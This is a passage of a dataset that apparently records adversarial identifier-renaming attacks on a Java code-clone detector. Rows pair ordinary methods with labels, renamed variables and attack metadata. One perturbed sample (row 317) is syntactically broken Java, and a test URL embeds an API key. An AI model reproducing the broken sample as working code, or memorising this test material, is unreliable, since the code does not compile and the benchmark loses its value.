        fos.write(new String(""Chemistry Development Kit, master version as of "" + new Date().toString() + "" (http://cdk.sf.net)"" + linesep).getBytes());
        fos.write(new String(""Copyright 1997-2009 The CDK Development Team"" + linesep).getBytes());
        fos.write(new String(""License: LGPL v2 (http://www.gnu.org/licenses/old-licenses/gpl-2.0.html)"" + linesep).getBytes());
        fos.write(new String(""Download: https://sourceforge.net/projects/cdk/files/"" + linesep).getBytes());
        fos.write(new String(""Source available at: http://sourceforge.net/scm/?type=git&group_id=20024"" + linesep + linesep).getBytes());
        File[] files = new File(args[0]).listFiles(new JarFileFilter());
        for (int i = 0; i < files.length; i++) {
            if (new File(files[i].getPath() + "".meta"").exists()) {
                Map<String, Map<String, String>> metaprops = readProperties(new File(files[i].getPath() + "".meta""));
                Iterator<String> itsect = metaprops.keySet().iterator();
                while (itsect.hasNext()) {
                    String section = itsect.next();
                    fos.write(new String(metaprops.get(section).get(""Library"") + "" "" + metaprops.get(section).get(""Version"") + "" ("" + metaprops.get(section).get(""Homepage"") + "")"" + linesep).getBytes());
                    fos.write(new String(""Copyright "" + metaprops.get(section).get(""Copyright"") + linesep).getBytes());
                    fos.write(new String(""License: "" + metaprops.get(section).get(""License"") + "" ("" + metaprops.get(section).get(""LicenseURL"") + "")"" + linesep).getBytes());
                    fos.write(new String(""Download: "" + metaprops.get(section).get(""Download"") + linesep).getBytes());
                    fos.write(new String(""Source available at: "" + metaprops.get(section).get(""SourceCode"") + linesep + linesep).getBytes());
                }
            }
            if (new File(files[i].getPath() + "".extra"").exists()) {
                fos.write(new String(""The author says:"" + linesep).getBytes());
                FileInputStream in = new FileInputStream(new File(files[i].getPath() + "".extra""));
                int len;
                byte[] buf = new byte[1024];
                while ((len = in.read(buf)) > 0) {
                    fos.write(buf, 0, len);
                }
            }
            fos.write(linesep.getBytes());
        }
        fos.close();
    }
",181,,LABEL_1,LABEL_1,LABEL_1,-1,"write,jarOut,allEntries,iterator,jar,jarEntries,o1,entryStream",,,,0,,0,GA,2806,1.0613280256589255,failed,[]
307,"    public static DigitalObjectContent byReference(final InputStream inputStream) {
        try {
            File tempFile = File.createTempFile(""tempContent"", ""tmp"");
            tempFile.deleteOnExit();
            FileOutputStream out = new FileOutputStream(tempFile);
            IOUtils.copyLarge(inputStream, out);
            out.close();
            return new ImmutableContent(tempFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
        throw new IllegalStateException(""Could not create content for input stream: "" + inputStream);
    }
 <SPLIT>     private static final void copyFile(File srcFile, File destDir, byte[] buffer) {
        try {
            File destFile = new File(destDir, srcFile.getName());
            InputStream in = new FileInputStream(srcFile);
            OutputStream out = new FileOutputStream(destFile);
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) out.write(buffer, 0, bytesRead);
            in.close();
            out.close();
        } catch (IOException ioe) {
            System.err.println(""Couldn't copy file '"" + srcFile + ""' to directory '"" + destDir + ""'"");
        }
    }
",92,,LABEL_1,LABEL_1,LABEL_1,-1,"byReference,inputStream,tempFile,out",,,,0,,0,GA,642,0.23027093807856241,failed,[]
308,"    public boolean isValidPage(BookPage page) {
        boolean isValid = false;
        try {
            if (page.getType() == BookPage.TYPE_RESOURCE) {
                BookPagePreviewPanel panel = new BookPagePreviewPanel(dControl, true);
                panel.setCurrentBookPage(page);
                isValid = !page.getUri().equals("""") && panel.isValid();
            } else if (page.getType() == BookPage.TYPE_URL) {
                URL url = new URL(page.getUri());
                url.openStream().close();
                isValid = true;
            } else if (page.getType() == BookPage.TYPE_IMAGE) {
                if (page.getUri().length() > 0) isValid = true;
            }
        } catch (Exception e) {
            isValid = false;
        }
        return isValid;
    }
 <SPLIT>     private File unpackZIP(URL url, String dirName) {
        try {
            URLConnection connection = url.openConnection();
            if (connection instanceof JarURLConnection) {
                File destDir = new File(getExtensionsDirectory() + EGEConstants.fS + dirName);
                destDir.mkdirs();
                EGEIOUtils.unzipFile(((JarURLConnection) connection).getJarFile(), destDir);
                return destDir;
            }
        } catch (IOException e) {
            LOGGER.error(""Could not unzip jar file."", e);
        }
        return null;
    }
",160,,LABEL_0,LABEL_0,LABEL_0,-1,"isValidPage,page,panel,isValid,url",,,,0,,0,GA,1347,0.4839070717493693,failed,[]
309,"    public static final synchronized String hash(String data) {
        if (digest == null) {
            try {
                digest = MessageDigest.getInstance(""MD5"");
            } catch (NoSuchAlgorithmException nsae) {
                log.error(""Failed to load the MD5 MessageDigest. "" + ""Jive will be unable to function normally."", nsae);
            }
        }
        try {
            digest.update(data.getBytes(""utf-8""));
        } catch (UnsupportedEncodingException e) {
            log.error(e);
        }
        return encodeHex(digest.digest());
    }
 <SPLIT>     private static final String hash(String input, String algorithm) {
        try {
            MessageDigest dig = MessageDigest.getInstance(algorithm);
            dig.update(input.getBytes());
            StringBuffer result = new StringBuffer();
            byte[] digest = dig.digest();
            String[] hex = { ""0"", ""1"", ""2"", ""3"", ""4"", ""5"", ""6"", ""7"", ""8"", ""9"", ""a"", ""b"", ""c"", ""d"", ""e"", ""f"" };
            for (int i = 0; i < digest.length; i++) {
                int u = digest[i];
                u &= 0x000000FF;
                int highCount = u / 16;
                int lowCount = u - (highCount * 16);
                result.append(hex[highCount]);
                result.append(hex[lowCount]);
            }
            return result.toString();
        } catch (NoSuchAlgorithmException e) {
            return null;
        }
    }
",98,,LABEL_1,LABEL_1,LABEL_1,-1,"hash,data,digest",,,,0,,0,GA,998,0.357079005241394,failed,[]
310,"    @Override
    public File call() throws IOException {
        HttpURLConnection conn = null;
        ReadableByteChannel fileDownloading = null;
        FileChannel fileWriting = null;
        try {
            conn = (HttpURLConnection) url.openConnection();
            if (size == -1) {
                size = conn.getContentLength();
            }
            fileDownloading = Channels.newChannel(conn.getInputStream());
            fileWriting = new FileOutputStream(file).getChannel();
            long left = size;
            long chunkSize = BLOCK_SIZE;
            for (long downloaded = 0; downloaded < size; left = size - downloaded) {
                if (left < BLOCK_SIZE) {
                    chunkSize = left;
                }
                fileWriting.transferFrom(fileDownloading, downloaded, chunkSize);
                downloaded += chunkSize;
                setProgress(downloaded);
            }
        } finally {
            if (file != null) {
                file.deleteOnExit();
            }
            if (conn != null) {
                conn.disconnect();
            }
            if (fileDownloading != null) {
                try {
                    fileDownloading.close();
                } catch (IOException ioe) {
                    Helper.logger.log(Level.SEVERE, ""Не удалось закрыть поток скачивания"", ioe);
                }
            }
            if (fileWriting != null) {
                try {
                    fileWriting.close();
                } catch (IOException ioe) {
                    Helper.logger.log(Level.SEVERE, ""Не удалось закрыть поток записи в файл"", ioe);
                }
            }
        }
        return file;
    }
 <SPLIT>     @Test
    public void test_validate_geo_getEvents() {
        try {
            SchemaFactory factory = SchemaFactory.newInstance(""http://www.w3.org/2001/XMLSchema"");
            File schemaLocation = new File(""tes.xsd"");
            Schema schema = factory.newSchema(schemaLocation);
            Validator validator = schema.newValidator();
            URL url = new URL(""http://ws.audioscrobbler.com/2.0/?method=geo.getevents&location=madrid&api_key=b25b959554ed76058ac220b7b2e0a026"");
            InputStream inputStream = url.openStream();
            Source source = new StreamSource(inputStream);
            validator.validate(source);
        } catch (IOException ex) {
            Logger.getLogger(GetEvents_Test.class.getName()).log(Level.SEVERE, null, ex);
            assertFalse(""File not found"", true);
        } catch (SAXException ex) {
            Logger.getLogger(GetEvents_Test.class.getName()).log(Level.SEVERE, null, ex);
            assertFalse(""Schema did not validate"", true);
        }
        assertTrue(true);
    }
",261,,LABEL_0,LABEL_0,LABEL_0,-1,"call,conn,fileDownloading,fileWriting,size,left,chunkSize,downloaded",,,,0,,0,GA,3119,1.1502947608629863,failed,[]
311,"    public boolean update(String dbName, Query[] queries) throws ServiceException {
        Connection con = null;
        PreparedStatement pstmt = null;
        int rows = 0;
        try {
            con = getDbConnection().getConnection(dbName);
            con.setAutoCommit(false);
            for (int i = 0; i < queries.length; i++) {
                Query query = queries[i];
                System.out.println(query.getSql());
                pstmt = con.prepareStatement(query.getSql());
                addParametersToQuery(query, pstmt);
                rows += pstmt.executeUpdate();
            }
            con.commit();
            return rows > 0;
        } catch (DbException e) {
            log.error(""[DAOService::update]  "" + e.getMessage(), e);
            log.error(""[DAOService::update] Execute rollback "" + e.getMessage(), e);
            try {
                con.rollback();
            } catch (SQLException e1) {
                log.error(""[DAOService::update] Errore durante il rollback "" + e.getMessage(), e);
                throw new ServiceException(e.getMessage());
            }
            throw new ServiceException(e.getMessage());
        } catch (SQLException e) {
            log.error(""[DAOService::update]  "" + e.getMessage(), e);
            try {
                con.rollback();
            } catch (SQLException e1) {
                log.error(""[DAOService::update] Errore durante il rollback "" + e.getMessage(), e);
                throw new ServiceException(e.getMessage());
            }
            throw new ServiceException(e.getMessage());
        } finally {
            closeConnection(con, pstmt, null);
        }
    }
 <SPLIT>     public static boolean doTest(Getter<?> context, Document node) {
        try {
            URL url = new URL(StringUtil.evaluateEL(Documents.getDocumentValue(node, ""url""), context));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Assert.isTrue(conn.getResponseCode() < 400);
            conn.disconnect();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
",318,,LABEL_0,LABEL_0,LABEL_0,-1,"update,dbName,queries,con,pstmt,rows,i,query",,,,0,,0,GA,3056,1.112331227461497,failed,[]
312,"    public void setImg() {
        JFileChooser jFileChooser1 = new JFileChooser();
        String separator = """";
        if (JFileChooser.APPROVE_OPTION == jFileChooser1.showOpenDialog(this.getFatherFrame())) {
            setPath(jFileChooser1.getSelectedFile().getPath());
            separator = jFileChooser1.getSelectedFile().separator;
            File dirImg = new File(""."" + separator + ""images"");
            if (!dirImg.exists()) {
                dirImg.mkdir();
            }
            int index = getPath().lastIndexOf(separator);
            String imgName = getPath().substring(index);
            String newPath = dirImg + imgName;
            try {
                File inputFile = new File(getPath());
                File outputFile = new File(newPath);
                if (!inputFile.getCanonicalPath().equals(outputFile.getCanonicalPath())) {
                    FileInputStream in = new FileInputStream(inputFile);
                    FileOutputStream out = new FileOutputStream(outputFile);
                    int c;
                    while ((c = in.read()) != -1) out.write(c);
                    in.close();
                    out.close();
                }
            } catch (Exception ex) {
                ex.printStackTrace();
                LogHandler.log(ex.getMessage(), Level.INFO, ""LOG_MSG"", isLoggingEnabled());
                JOptionPane.showMessageDialog(null, ex.getMessage().substring(0, Math.min(ex.getMessage().length(), getFatherPanel().MAX_DIALOG_MSG_SZ)) + ""-"" + getClass(), ""Set image"", JOptionPane.ERROR_MESSAGE);
            }
            setPath(newPath);
            bckImg = new ImageIcon(getPath());
        }
    }
 <SPLIT>     public static File copyFile(File fileToCopy, File copiedFile) {
        BufferedInputStream in = null;
        BufferedOutputStream outWriter = null;
        if (!copiedFile.exists()) {
            try {
                copiedFile.createNewFile();
            } catch (IOException e1) {
                e1.printStackTrace();
                return null;
            }
        }
        try {
            in = new BufferedInputStream(new FileInputStream(fileToCopy), 4096);
            outWriter = new BufferedOutputStream(new FileOutputStream(copiedFile), 4096);
            int c;
            while ((c = in.read()) != -1) outWriter.write(c);
            in.close();
            outWriter.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            return null;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return copiedFile;
    }
",333,,LABEL_1,LABEL_1,LABEL_1,-1,"setImg,jFileChooser1,separator,dirImg,index,imgName,newPath,inputFile,outputFile,in,out,c,bckImg",,,,0,,0,GA,4622,1.7015464504559834,failed,[]
313,"    public static boolean dump(File source, File target) {
        boolean done = false;
        try {
            InputStream is = new BufferedInputStream(new FileInputStream(source));
            OutputStream os = new BufferedOutputStream(new FileOutputStream(target));
            while (is.available() > 0) {
                os.write(is.read());
            }
            os.flush();
            os.close();
            is.close();
            return true;
        } catch (IOException e) {
        }
        return done;
    }
 <SPLIT>     public InputSource resolveEntity(String publicId, String systemId) {
        String resolved = getResolvedEntity(publicId, systemId);
        if (resolved != null) {
            try {
                InputSource iSource = new InputSource(resolved);
                iSource.setPublicId(publicId);
                URL url = new URL(resolved);
                InputStream iStream = url.openStream();
                iSource.setByteStream(iStream);
                return iSource;
            } catch (Exception e) {
                catalogManager.debug.message(1, ""Failed to create InputSource ("" + e.toString() + "")"", resolved);
                return null;
            }
        }
        return null;
    }
",102,,LABEL_0,LABEL_0,LABEL_0,-1,"dump,source,target,is,os,done",,,,0,,0,GA,2144,0.7577693621317546,failed,[]
314,"    public void send(org.hibernate.Session hsession, Session session, String repositoryName, int ideIdint, String to, String cc, String bcc, String subject, String body, Vector attachments, boolean isHtml, String charset, InternetHeaders headers, String priority) throws MailException {
        try {
            if (charset == null) {
                charset = MimeUtility.javaCharset(Charset.defaultCharset().displayName());
            }
            if ((body == null) || body.trim().equals("""")) {
                body = "" "";
            }
            Email email = null;
            if (isHtml) {
                email = new HtmlEmail();
            } else {
                email = new MultiPartEmail();
            }
            email.setCharset(charset);
            Users user = getUser(hsession, repositoryName);
            Identity identity = getIdentity(hsession, ideIdint, user);
            InternetAddress _returnPath = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _from = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _replyTo = new InternetAddress(identity.getIdeReplyTo(), identity.getIdeName());
            InternetAddress[] _to = MessageUtilities.encodeAddresses(to, null);
            InternetAddress[] _cc = MessageUtilities.encodeAddresses(cc, null);
            InternetAddress[] _bcc = MessageUtilities.encodeAddresses(bcc, null);
            if (_from != null) {
                email.setFrom(_from.getAddress(), _from.getPersonal());
            }
            if (_returnPath != null) {
                email.addHeader(""Return-Path"", _returnPath.getAddress());
                email.addHeader(""Errors-To"", _returnPath.getAddress());
                email.addHeader(""X-Errors-To"", _returnPath.getAddress());
            }
            if (_replyTo != null) {
                email.addReplyTo(_replyTo.getAddress(), _replyTo.getPersonal());
            }
            if ((_to != null) && (_to.length > 0)) {
                HashSet aux = new HashSet(_to.length);
                Collections.addAll(aux, _to);
                email.setTo(aux);
            }
            if ((_cc != null) && (_cc.length > 0)) {
                HashSet aux = new HashSet(_cc.length);
                Collections.addAll(aux, _cc);
                email.setCc(aux);
            }
            if ((_bcc != null) && (_bcc.length > 0)) {
                HashSet aux = new HashSet(_bcc.length);
                Collections.addAll(aux, _bcc);
                email.setBcc(aux);
            }
            email.setSubject(subject);
            Date now = new Date();
            email.setSentDate(now);
            File dir = new File(System.getProperty(""user.home"") + File.separator + ""tmp"");
            if (!dir.exists()) {
                dir.mkdir();
            }
            if ((attachments != null) && (attachments.size() > 0)) {
                for (int i = 0; i < attachments.size(); i++) {
                    ByteArrayInputStream bais = null;
                    FileOutputStream fos = null;
                    try {
                        MailPartObj obj = (MailPartObj) attachments.get(i);
                        File file = new File(dir, obj.getName());
                        bais = new ByteArrayInputStream(obj.getAttachent());
                        fos = new FileOutputStream(file);
                        IOUtils.copy(bais, fos);
                        EmailAttachment attachment = new EmailAttachment();
                        attachment.setPath(file.getPath());
                        attachment.setDisposition(EmailAttachment.ATTACHMENT);
                        attachment.setDescription(""File Attachment: "" + file.getName());
                        attachment.setName(file.getName());
                        if (email instanceof MultiPartEmail) {
                            ((MultiPartEmail) email).attach(attachment);
                        }
                    } catch (Exception ex) {
                    } finally {
                        IOUtils.closeQuietly(bais);
                        IOUtils.closeQuietly(fos);
                    }
                }
            }
            String mid = getId();
            if (headers != null) {
                Header xheader;
                Enumeration xe = headers.getAllHeaders();
                for (; xe.hasMoreElements(); ) {
                    xheader = (Header) xe.nextElement();
                    if (xheader.getName().equals(RFC2822Headers.IN_REPLY_TO)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    } else if (xheader.getName().equals(RFC2822Headers.REFERENCES)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    }
                }
            } else {
                email.addHeader(RFC2822Headers.IN_REPLY_TO, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
                email.addHeader(RFC2822Headers.REFERENCES, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
            }
            if (priority != null) {
                if (priority.equals(""high"")) {
                    email.addHeader(""Importance"", priority);
                    email.addHeader(""X-priority"", ""1"");
                } else if (priority.equals(""low"")) {
                    email.addHeader(""Importance"", priority);
                    email.addHeader(""X-priority"", ""5"");
                }
            }
            if (email instanceof HtmlEmail) {
                ((HtmlEmail) email).setHtmlMsg(body);
            } else {
                email.setMsg(body);
            }
            email.setMailSession(session);
            email.buildMimeMessage();
            MimeMessage mime = email.getMimeMessage();
            int size = MessageUtilities.getMessageSize(mime);
            if (!controlQuota(hsession, user, size)) {
                throw new MailException(""ErrorMessages.mail.quota.exceded"");
            }
            messageable.saveSentMessage(mid, mime, user);
            Thread thread = new Thread(new SendMessageThread(email));
            thread.start();
        } catch (MailException e) {
            throw e;
        } catch (Exception e) {
            throw new MailException(e);
        } catch (java.lang.OutOfMemoryError ex) {
            System.gc();
            throw new MailException(ex);
        } catch (Throwable e) {
            throw new MailException(e);
        } finally {
            GeneralOperations.closeHibernateSession(hsession);
        }
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",1214,,LABEL_1,LABEL_0,,-4,"send,hsession,session,repositoryName,ideIdint,to,cc,bcc,subject,body,attachments,isHtml,charset,headers,priority,email,user,identity,_returnPath,_from,_replyTo,_to,_cc,_bcc",,,,0,,0,Greedy,1,0.0011131405830383302,,[]
315,"    private static void loadDefaultSettings(final String configFileName) {
        InputStream in = null;
        OutputStream out = null;
        try {
            in = Thread.currentThread().getContextClassLoader().getResourceAsStream(META_INF_DEFAULT_CONFIG_PROPERTIES);
            out = new FileOutputStream(configFileName);
            IOUtils.copy(in, out);
        } catch (final Exception e) {
            log.warn(""Unable to pull out the default."", e);
            throw new RuntimeException(e);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
        }
    }
 <SPLIT>     private void unJarStart(String jarPath, String jarEntryStart) {
        String path;
        if (jarPath.lastIndexOf(""lib/"") >= 0) path = jarPath.substring(0, jarPath.lastIndexOf(""lib/"")); else path = jarPath.substring(0, jarPath.lastIndexOf(""/""));
        String relPath = jarEntryStart.substring(0, jarEntryStart.lastIndexOf(""/""));
        try {
            new File(path + ""/"" + relPath).mkdirs();
            JarFile jar = new JarFile(jarPath);
            Enumeration<JarEntry> entries = jar.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String jarEntry = entry.getName();
                if (jarEntry.startsWith(jarEntryStart)) {
                    ZipEntry ze = jar.getEntry(jarEntry);
                    File bin = new File(path + ""/"" + jarEntry);
                    IOUtils.copy(jar.getInputStream(ze), new FileOutputStream(bin));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",102,,LABEL_1,LABEL_1,LABEL_1,-1,"loadDefaultSettings,configFileName,in,out",,,,0,,0,GA,1091,0.3932986577351888,failed,[]
316,"    protected static Parser buildParser(URL url) throws IOException, ParserException {
        Parser parser;
        URLConnection connection = openConnection(url);
        if (!(connection instanceof HttpURLConnection) || ((HttpURLConnection) connection).getResponseCode() == 200) {
            parser = new Parser(connection);
        } else {
            parser = null;
        }
        return parser;
    }
 <SPLIT> 	public static void Sample1(String myField, String condition1, String condition2) throws SQLException {
		Connection connection = DriverManager.getConnection(""jdbc:postgresql://localhost/test"", ""user"", ""password"");
		connection.setAutoCommit(false);
		
		PreparedStatement ps = connection.prepareStatement(""UPDATE myTable SET myField = ? WHERE myOtherField1 = ? AND myOtherField2 = ?"");
		ps.setString(1, myField);
		ps.setString(2, condition1);
		ps.setString(3, condition2);
		
		// If more than 10 entries change, panic and rollback
		int numChanged = ps.executeUpdate();
		if(numChanged > 10) {
			connection.rollback();
		} else {
			connection.commit();
		}
		
		ps.close();
		connection.close();
	}
",69,,LABEL_0,LABEL_0,LABEL_0,-1,"buildParser,url,ParserException,parser,connection",,,,0,,0,GA,1745,0.6181751370429993,failed,[]
317,"    public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
 <SPLIT>     private void copyFile(final String sourceFileName, final File path) throws IOException {
        final File source = new File(sourceFileName);
        final File destination = new File(path, source.getName());
        FileChannel srcChannel = null;
        FileChannel dstChannel = null;
        try {
            srcChannel = new FileInputStream(source).getChannel();
            dstChannel = new FileOutputStream(destination).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        } finally {
            try {
                if (dstChannel != null) {
                    dstChannel.close();
                }
            } catch (Exception exception) {
            }
            try {
                if (srcChannel != null) {
                    srcChannel.close();
                }
            } catch (Exception exception) {
            }
        }
    }
",765,"    public void subversion(File src, File source) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser tp = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        tp.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat furl= tp.detectFileFormat();
            if (url != FileFormat.ACRNEMA_STREAM) {
                System.query.println(""
"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            tp.parseDcmFile(url, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.query.println(""
"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hhasBytedata= tp.getReadTag() == Tags.PixelData;
            booleaninflatee = hasBytedata && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int ppcln= tp.getReadLength();
            if (hasBytedata) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pcln = pcln * 4 / 3;
                }
                if (pcln != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.query.println(""
"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream ouquery new BufferedOutputStream(new FileOutputStream(source));
            try {
            } finally {
                ds.writeFile(query, encodeParam());
                if (hasBytedata) {
                    if (!skipGroupLen) {
                        query.write(PXDATA_GROUPLEN);
                        int grlen = pcln + 8;
                        query.write((byte) grlen);
                        query.write((byte) (grlen >> 8));
                        query.write((byte) (grlen >> 16));
                        query.write((byte) (grlen >> 24));
                    }
                    query.write(PXDATA_TAG);
                   queryt.write((byte) pcln);
                   queryt.write((byte) (pcln >> 8));
                   queryt.write((byte) (pcln >> 16));
                   queryt.write((byte) (pcln >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pcln > 0; pcln -= 3) {
                        query.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        query.write(b2 & 0x0f);
                        query.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        query.write(b3 >> 4);
                    }
                } else {
                    for (; pcln > 0; --pcln) {
                        query.write(in.read());
                    }
                }
                query.close();
            }
            System.query.print('.');
        } finally {
            in.close();
        }
    }
",LABEL_1,LABEL_1,0.5286539793014526,1,"convert,src,dest,in,p,ds,format,hasPixelData,inflate,pxlen,out",,,,39,"convert:subversion,src:src,dest:source,in:in,p:tp,ds:ds,format:url,hasPixelData:hasBytedata,inflate:inflate,pxlen:pcln,out:query,",4,GA,575,0.2316660722096761,ga,[]
318,"    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String senha = """";
